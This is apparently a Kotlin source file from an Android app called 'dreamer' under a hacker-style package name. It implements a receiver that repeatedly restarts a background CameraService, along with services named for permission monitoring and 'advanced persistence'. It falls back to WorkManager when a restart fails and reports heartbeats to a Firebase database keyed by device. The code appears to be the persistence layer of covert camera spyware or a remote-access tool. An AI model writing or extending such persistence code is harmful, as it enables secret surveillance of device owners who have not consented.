package com.h4k3r.dreamer

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase

/**
 * BroadcastReceiver for reviving CameraService when foreground service restrictions apply.
 * This is triggered by AlarmManager to ensure camera service persistence.
 */
class CameraRevivalReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "CameraRevivalReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        Log.d(TAG, "Camera revival receiver triggered")

        try {
            // Check if CameraService is running
            if (!isCameraServiceRunning(context)) {
                Log.w(TAG, "CameraService not running, attempting revival")

                // Try to restart CameraService
                val serviceIntent = Intent(context, CameraService::class.java)

                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        ContextCompat.startForegroundService(context, serviceIntent)
                        Log.d(TAG, "CameraService revived as foreground service")
                    } else {
                        context.startService(serviceIntent)
                        Log.d(TAG, "CameraService revived as regular service")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to revive CameraService via direct start: ${e.message}")

                    // Fallback: Use WorkManager
                    scheduleCameraRevivalWork(context)
                }
            } else {
                Log.d(TAG, "CameraService already running")

                // Still update Firebase heartbeat to show revival system is active
                updateFirebaseHeartbeat(context)
            }

            // Also check and restart other critical services
            reviveOtherCriticalServices(context)

        } catch (e: Exception) {
            Log.e(TAG, "Camera revival receiver error: ${e.message}")
        }
    }

    private fun isCameraServiceRunning(context: Context): Boolean {
        return try {
            val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val runningServices = activityManager.getRunningServices(Integer.MAX_VALUE)
            runningServices.any { it.service.className == CameraService::class.java.name }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking CameraService status: ${e.message}")
            false
        }
    }

    private fun scheduleCameraRevivalWork(context: Context) {
        try {
            val workRequest = androidx.work.OneTimeWorkRequestBuilder<CameraBackgroundWorker>()
                .setInitialDelay(1, java.util.concurrent.TimeUnit.SECONDS)
                .build()

            androidx.work.WorkManager.getInstance(context).enqueueUniqueWork(
                "camera_revival_work",
                androidx.work.ExistingWorkPolicy.REPLACE,
                workRequest
            )

            Log.d(TAG, "Scheduled camera revival via WorkManager")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to schedule camera revival work: ${e.message}")
        }
    }

    private fun updateFirebaseHeartbeat(context: Context) {
        try {
            val prefs = context.getSharedPreferences("dreamer_auth", Context.MODE_PRIVATE)
            val secretKey = prefs.getString("secret_key", "")
            val deviceId = prefs.getString("device_id", "")

            if (!secretKey.isNullOrEmpty() && !deviceId.isNullOrEmpty()) {
                Firebase.database.reference
                    .child("devices")
                    .child(secretKey)
                    .child(deviceId)
                    .child("info")
                    .child("revival_system_time")
                    .setValue(System.currentTimeMillis())

                Log.d(TAG, "Firebase heartbeat updated from revival receiver")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to update Firebase heartbeat: ${e.message}")
        }
    }

    private fun reviveOtherCriticalServices(context: Context) {
        val criticalServices = listOf(
            PermissionMonitorService::class.java,
            AdvancedPersistenceService::class.java
        )

        criticalServices.forEach { serviceClass ->
            try {
                if (!isServiceRunning(context, serviceClass.name)) {
                    Log.w(TAG, "${serviceClass.simpleName} not running, attempting revival")

                    val intent = Intent(context, serviceClass)
                    try {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            ContextCompat.startForegroundService(context, intent)
                        } else {
                            context.startService(intent)
                        }
                        Log.d(TAG, "${serviceClass.simpleName} revived")
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to revive ${serviceClass.simpleName}: ${e.message}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error reviving ${serviceClass.simpleName}: ${e.message}")
            }
        }
    }

    private fun isServiceRunning(context: Context, serviceName: String): Boolean {
        return try {
            val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val runningServices = activityManager.getRunningServices(Integer.MAX_VALUE)
            runningServices.any { it.service.className == serviceName }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking service status for $serviceName: ${e.message}")
            false
        }
    }
}